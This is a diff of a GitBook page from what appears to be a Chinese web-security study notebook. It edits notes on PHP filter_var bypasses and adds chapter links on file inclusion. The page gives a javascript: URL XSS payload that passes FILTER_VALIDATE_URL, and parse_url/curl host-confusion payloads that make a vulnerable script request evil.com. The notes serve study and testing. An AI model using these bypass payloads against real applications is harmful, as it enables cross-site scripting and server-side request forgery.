@@ -318,25 +318,12 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.4.8" data-path="数组的数组和二维数组.html">
+        <li class="chapter " data-level="2.1.4.8" data-path="REQUEST数组.html">
             
-                <a href="数组的数组和二维数组.html">
-            
-                    
-                    数组的数组和二维数组
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.4.9" data-path="_REQUEST数组.html">
-            
-                <a href="_REQUEST数组.html">
+                <a href="REQUEST数组.html">
             
                     
-                    深入理解_REQUEST数组
+                    REQUEST数组
             
                 </a>
             
@@ -840,7 +827,34 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.1.9.1" data-path="包含environ.html">
+        <li class="chapter " data-level="2.1.9.1" data-path="伪协议文件包含.html">
+            
+                <a href="伪协议文件包含.html">
+            
+                    
+                    PHP伪协议
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.9.1.1" data-path="包含日志.html">
+            
+                <a href="包含日志.html">
+            
+                    
+                    包含日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9.1.2" data-path="包含environ.html">
             
                 <a href="包含environ.html">
             
@@ -853,7 +867,7 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.9.2" data-path="包含临时文件.html">
+        <li class="chapter " data-level="2.1.9.1.3" data-path="包含临时文件.html">
             
                 <a href="包含临时文件.html">
             
@@ -866,7 +880,7 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.9.3" data-path="包含session文件.html">
+        <li class="chapter " data-level="2.1.9.1.4" data-path="包含session文件.html">
             
                 <a href="包含session文件.html">
             
@@ -876,6 +890,11 @@
                 </a>
             
 
+            
+        </li>
+    
+
+            </ul>
             
         </li>
     
@@ -4009,18 +4028,22 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="filtervar">filter_var</h2>
-<p>filter_var &#x2014; &#x4F7F;&#x7528;&#x7279;&#x5B9A;&#x7684;&#x8FC7;&#x6EE4;&#x5668;&#x8FC7;&#x6EE4;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;</p>
-<p>&#x51FD;&#x6570;&#x7ED3;&#x6784;&#xFF1A;</p>
+                                <h1 id="filtervar">filter_var</h1>
+<p><strong>&#x51FD;&#x6570;&#x7ED3;&#x6784;&#xFF1A;</strong></p>
 <pre><code>filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed
-</code></pre><h3 id="filtervalidateurl"><code>FILTER_VALIDATE_URL</code></h3>
-<p>&#x53C2;&#x8003;&#xFF1A;</p>
+</code></pre><h2 id="filtervalidateurl">FILTER_VALIDATE_URL</h2>
+<p><strong>&#x53C2;&#x8003;&#xFF1A;</strong></p>
 <ul>
 <li><a href="https://secure.php.net/manual/zh/function.filter-var.php" target="_blank">https://secure.php.net/manual/zh/function.filter-var.php</a></li>
 <li><a href="https://www.anquanke.com/post/id/101058" target="_blank">https://www.anquanke.com/post/id/101058</a></li>
 </ul>
-<p><strong>javascript</strong><br><code>filter_var(&apos;javascript://comment%250Aalert(1)&apos;, FILTER_VALIDATE_URL);</code>&#x4F1A;&#x5BFC;&#x81F4;XSS&#x653B;&#x51FB;&#x3002;&#x56E0;&#x4E3A;//&#x5728;JavaScript&#x4E2D;&#x8868;&#x793A;&#x5355;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;%250a&#x89E3;&#x7801;&#x540E;&#x4E3A;&#x6362;&#x884C;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;alert(1)&#x548C;//&#x4E0D;&#x5728;&#x4E00;&#x884C;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x3002;</p>
-<p>demo</p>
+<h3 id="&#x5229;&#x7528;">&#x5229;&#x7528;</h3>
+<h4 id="javascript">javascript</h4>
+<pre><code class="lang-php">filter_var(<span class="hljs-string">&apos;javascript://comment%250Aalert(1)&apos;</span>, FILTER_VALIDATE_URL);
+</code></pre>
+<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;XSS&#x653B;&#x51FB;&#x3002;</p>
+<p>&#x56E0;&#x4E3A;<code>//</code>&#x5728;JavaScript&#x4E2D;&#x8868;&#x793A;&#x5355;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;<code>%250a</code>&#x89E3;&#x7801;&#x540E;&#x4E3A;&#x6362;&#x884C;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;<code>alert(1)</code>&#x548C;<code>//</code>&#x4E0D;&#x5728;&#x4E00;&#x884C;&#xFF0C;js&#x4EE3;&#x7801;&#x6210;&#x529F;&#x6267;&#x884C;&#x3002;</p>
+<p><strong>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</strong></p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
 $url = filter_var($_GET[<span class="hljs-string">&apos;url&apos;</span>],FILTER_VALIDATE_URL);
 var_dump($url);
@@ -4028,7 +4051,13 @@ $url=htmlspecialchars($url);
 var_dump($url);
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&apos;$url&apos;&gt;Next slide &lt;/a&gt;&quot;</span>;
 </code></pre>
-<p><strong>&#x7F51;&#x5740;</strong><br>&#x5728;&#x5982;&#x4E0B;&#x811A;&#x672C;&#x4E2D;&#xFF1A;</p>
+<p><img src="../images/19-7-23_PHP_filter-var_filter-validate-url_1.png" alt="1563864262526"></p>
+<h4 id="curl">curl</h4>
+<p><strong>&#x5229;&#x7528;&#x6761;&#x4EF6;</strong></p>
+<ul>
+<li>curl&lt;=7.47.0&#xFF08;win&#x4E0B;7.55.1&#x4E0D;&#x53EF;&#x7528;&#xFF09;</li>
+</ul>
+<p>&#x5728;&#x5982;&#x4E0B;&#x811A;&#x672C;&#x4E2D;&#xFF1A;</p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
    $url = $_GET[<span class="hljs-string">&apos;url&apos;</span>];
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Argument: &quot;</span>.$url.<span class="hljs-string">&quot;\n&quot;</span>;
@@ -4036,6 +4065,7 @@ var_dump($url);
       $r = parse_url($url);
       var_dump($r);
       <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/skysec\.top$/&apos;</span>, $r[<span class="hljs-string">&apos;host&apos;</span>])) {
+          <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;start curl&apos;</span>;
          exec(<span class="hljs-string">&apos;curl -v -s &quot;&apos;</span>.$r[<span class="hljs-string">&apos;host&apos;</span>].<span class="hljs-string">&apos;&quot;&apos;</span>, $a);
       } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: Host not allowed&quot;</span>;
@@ -4045,26 +4075,15 @@ var_dump($url);
    }
 <span class="hljs-meta">?&gt;</span>
 </code></pre>
-<p>&#x4EE5;&#x524D;&#x53EF;&#x7528;payload&#xFF1A;</p>
-<pre><code>?url=0://evil.com:23333;skysec.top:80/
-?url=0://evil$skysec.top
-</code></pre><p>&#x4F46;&#x662F;19-7-1&#x65E5;&#x6D4B;&#x8BD5;&#x4F1A;&#x62A5;&#x9519;&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre><code>Argument: 0://192.168.1.112:82,skysec.top:80/
-C:\Users\j7ur8\Desktop\html\index.php:6:
-array(4) {
-  &apos;scheme&apos; =&gt;
-  string(1) &quot;0&quot;
-  &apos;host&apos; =&gt;
-  string(27) &quot;192.168.1.112:82,skysec.top&quot;
-  &apos;port&apos; =&gt;
-  int(80)
-  &apos;path&apos; =&gt;
-  string(1) &quot;/&quot;
-}
-* Rebuilt URL to: 192.168.1.112:82,skysec.top/
-* Port number ended with &apos;,&apos;
-* Closing connection -1
-</code></pre><h3 id="filtervalidateemail"><code>FILTER_VALIDATE_EMAIL</code></h3>
+<p>&#x53EF;&#x7528;payload&#xFF1A;</p>
+<pre><code class="lang-url">&#x8BBF;&#x95EE;evil.com:2333
+?url=0://evil.com:23333;skysec.top:80/
+&#x8BBF;&#x95EE;evil.top
+?url=0://evil.com$skysec.top
+&#x8BBF;&#x95EE;evil.com:80
+?url=0://evil.com:80$skysec.top
+</code></pre>
+<h3 id="filtervalidateemail">FILTER_VALIDATE_EMAIL</h3>
 <p>&#x53C2;&#x8003;&#xFF1A;</p>
 <ul>
 <li><a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x03-filter_validate_email" target="_blank">https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x03-filter_validate_email</a></li>
@@ -4124,7 +4143,7 @@ $email = <span class="hljs-string">&apos;&quot;Joe\&apos;Blow&quot;@example.com&
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"filter_var","level":"2.1.6.3","depth":3,"next":{"title":"strpos","level":"2.1.6.4","depth":3,"path":"PHP/strpos.md","ref":"./PHP/strpos.md","articles":[]},"previous":{"title":"in_array","level":"2.1.6.2","depth":3,"path":"PHP/in_array.md","ref":"./PHP/in_array.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/filter_var.md","mtime":"2019-07-09T04:07:44.034Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-22T09:32:21.294Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"filter_var","level":"2.1.6.3","depth":3,"next":{"title":"strpos","level":"2.1.6.4","depth":3,"path":"PHP/strpos.md","ref":"./PHP/strpos.md","articles":[]},"previous":{"title":"in_array","level":"2.1.6.2","depth":3,"path":"PHP/in_array.md","ref":"./PHP/in_array.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/filter_var.md","mtime":"2019-07-23T07:27:08.801Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-23T08:55:46.947Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
